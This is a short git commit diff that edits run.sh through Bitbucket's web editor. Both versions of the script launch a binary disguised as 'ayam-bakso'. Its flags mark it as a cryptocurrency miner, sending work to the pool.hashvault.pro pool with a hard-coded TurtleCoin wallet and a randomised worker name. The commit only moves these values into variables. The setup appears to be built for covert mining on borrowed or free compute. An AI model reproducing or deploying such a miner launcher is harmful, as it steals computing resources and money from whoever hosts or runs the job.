4e36f492ac0fcea50288daf7d0604d337314e6cf
Noval Anto <novalanto6161@gmail.com>
2021-10-24 06:15:59 +0000

    run.sh edited online with Bitbucket

--- run.sh
+++ run.sh
@@ -1,1 +1,4 @@
-chmod 777 ayam-bakso && ./ayam-bakso -o pool.hashvault.pro:80 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR --keepalive --donate-level 1 -p $(echo $(shuf -i 1-20000 -n 1)-V) -k --tls
+POL=pool.hashvault.pro:80
+WAL=TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR
+WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
+chmod 777 ayam-bakso && ./ayam-bakso -o $POL -u $WAL --keepalive --donate-level 1 -p $WOR -k --tls
